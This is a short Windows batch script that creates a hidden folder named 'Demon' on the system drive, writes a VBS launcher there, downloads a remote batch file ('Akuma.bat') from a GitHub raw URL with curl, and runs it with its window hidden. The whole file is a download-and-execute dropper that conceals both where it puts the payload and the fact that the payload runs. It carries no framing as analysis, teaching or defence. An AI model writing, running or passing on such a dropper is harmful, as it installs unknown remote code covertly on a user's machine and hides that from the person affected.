@echo off
rmdir /s /q %homedrive%\Demon
mkdir %homedrive%\Demon
attrib +h %homedrive%\Demon
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Demon\Demon.vbs
echo objShell.Run "%homedrive%\Demon\Akuma.bat", 0, False >> %homedrive%\Demon\Demon.vbs
curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\Demon\akuma.bat
start %homedrive%\Demon\Demon.vbs
exit
